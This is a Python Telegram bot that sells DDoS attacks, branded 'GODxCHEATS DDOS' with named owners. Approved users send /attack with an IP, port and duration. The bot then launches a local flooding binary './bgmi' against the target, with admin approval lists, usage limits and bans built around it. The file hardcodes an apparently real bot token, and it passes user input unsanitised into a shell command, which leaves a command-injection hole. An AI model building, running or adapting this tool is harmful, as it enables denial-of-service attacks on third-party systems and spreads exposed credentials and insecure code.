import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext
from datetime import datetime, timedelta
from collections import defaultdict

TELEGRAM_BOT_TOKEN = '7819992909:AAHn51FAfPId42gmKUT5wPmCoyC4_g9OeN0'
ADMIN_USER_ID = 1662672529
APPROVED_IDS_FILE = 'approved_ids.txt'

attack_in_progress = False
cooldown_duration = 120  # Cooldown duration in seconds
max_attack_usage = 4  # Max attack usage per hour
ban_duration = 10  # Ban duration in minutes
attack_limit_duration = 250  # Max duration for an attack in seconds

approved_ids = set()
user_usage = defaultdict(list)  # Tracks user usage of /attack
banned_users = {}  # Tracks temporarily banned users
user_attacks = {}  # Tracks IP/port combinations per user


# Load approved IDs from file
def load_approved_ids():
    try:
        with open(APPROVED_IDS_FILE) as f:
            return set(line.strip() for line in f)
    except FileNotFoundError:
        return set()


def save_approved_ids(approved_ids):
    with open(APPROVED_IDS_FILE, 'w') as f:
        f.writelines(f"{id_}\n" for id_ in approved_ids)


approved_ids = load_approved_ids()


# Start command
async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐆𝐎𝐃x𝐂𝐇𝐄𝐀𝐓𝐒 𝐃𝐃𝐎𝐒*\n\n"
        "*🔻🔻🔻🔻🔻🔻🔻🔻🔻🔻🔻🔻🔻🔻*\n\n"
        "*PRIMIUM DDOS BOT TRY /help COMMAND*\n"
        "*OWNERS :- @GODxAloneBOY @RajOwner90*\n"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')


# Approve command
async def approve(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    args = context.args

    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need admin permission to use this command.*", parse_mode='Markdown')
        return

    if len(args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="* Usage » /approve id (user or group chat ID)*", parse_mode='Markdown')
        return

    target_id = args[0].strip()
    approved_ids.add(target_id)
    save_approved_ids(approved_ids)
    await context.bot.send_message(chat_id=chat_id, text=f"*✅ ID {target_id} approved.*", parse_mode='Markdown')


# Remove command
async def remove(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    args = context.args

    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need admin permission to use this command.*", parse_mode='Markdown')
        return

    if len(args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="* Usage » /remove id (user or group chat ID)*", parse_mode='Markdown')
        return

    target_id = args[0].strip()
    if target_id in approved_ids:
        approved_ids.discard(target_id)
        save_approved_ids(approved_ids)
        await context.bot.send_message(chat_id=chat_id, text=f"*✅ ID {target_id} removed.*", parse_mode='Markdown')
    else:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ ID {target_id} is not approved.*", parse_mode='Markdown')


# Attack command
async def attack(update: Update, context: CallbackContext):
    global attack_in_progress

    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)
    args = context.args
    current_time = datetime.now()

    if str(chat_id) not in approved_ids and user_id not in approved_ids:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need permission to use this bot.*", parse_mode='Markdown')
        return

    # Check ban status
    if user_id in banned_users and banned_users[user_id] > current_time:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You are temporarily banned from using this bot.*", parse_mode='Markdown')
        return

    # Check cooldown and attack limits
    if len(user_usage[user_id]) >= max_attack_usage:
        if (current_time - user_usage[user_id][0]).total_seconds() < 3600:
            banned_users[user_id] = current_time + timedelta(minutes=ban_duration)
            await context.bot.send_message(chat_id=chat_id, text="*⚠️ You are banned for 10 minutes due to spamming.*", parse_mode='Markdown')
            return
        else:
            user_usage[user_id].pop(0)

    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="* example » /attack ip port time*", parse_mode='Markdown')
        return

    ip, port, duration = args
    if not duration.isdigit() or int(duration) > attack_limit_duration:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Duration cannot exceed {attack_limit_duration} seconds.*", parse_mode='Markdown')
        return

    # Prevent duplicate attacks
    if (ip, port) in user_attacks.get(user_id, set()):
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You cannot attack the same IP/Port again.*", parse_mode='Markdown')
        return

    user_usage[user_id].append(current_time)
    user_attacks.setdefault(user_id, set()).add((ip, port))

    await context.bot.send_message(chat_id=chat_id, text=(
        f"*✅ 𝐀𝐓𝐓𝐀𝐂𝐊 𝐋𝐀𝐔𝐍𝐂𝐇𝐄𝐃 ✅*\n"
        f"*⭐ Target » {ip}*\n"
        f"*⭐ Port » {port}*\n"
        f"*⭐ Time » {duration} seconds*\n"
        f"*https://t.me/+03wLVBPurPk2NWRl*\n"
    ), parse_mode='Markdown')

    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))


async def run_attack(chat_id, ip, port, duration, context):
    global attack_in_progress
    attack_in_progress = True

    try:
        process = await asyncio.create_subprocess_shell(
            f"./bgmi {ip} {port} {duration} 50",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')

    finally:
        attack_in_progress = False
        await context.bot.send_message(chat_id=chat_id, text="*✅ 𝐀𝐓𝐓𝐀𝐂𝐊 𝐅𝐈𝐍𝐈𝐒𝐇𝐄𝐃 ✅*\n*SEND FEEDBACK TO OWNER*\n*@GODxAloneBOY @RajOwner90*", parse_mode='Markdown')


# Check command
async def check(update: Update, context: CallbackContext):
    user_info = "\n".join([f"ID: {u_id}, Username: @{update.effective_user.username}" for u_id in user_usage.keys()])
    await context.bot.send_message(chat_id=update.effective_chat.id, text=f"User Data:\n{user_info}")


# Warn command
async def warn(update: Update, context: CallbackContext):
    for user_id in user_usage.keys():
        await context.bot.send_message(chat_id=user_id, text="*⚠️ Warning! Please use the bot responsibly.*\nFeedback: @GODxAloneBOY", parse_mode='Markdown')


# Help command
async def help_command(update: Update, context: CallbackContext):
    message = (
        "*Available Commands:*\n"
        "/start - Welcome message\n"
        "/approve - Approve a user/group\n"
        "/remove - Remove a user/group\n"
        "/attack - Launch an attack\n"
        "/check - Check user usage\n"
        "/warn - Send a warning message\n"
        "/help - Show this help message\n"
    )
    await context.bot.send_message(chat_id=update.effective_chat.id, text=message, parse_mode='Markdown')


# Main function
def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("approve", approve))
    application.add_handler(CommandHandler("remove", remove))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("check", check))
    application.add_handler(CommandHandler("warn", warn))
    application.add_handler(CommandHandler("help", help_command))
    application.run_polling()


if __name__ == '__main__':
    main()
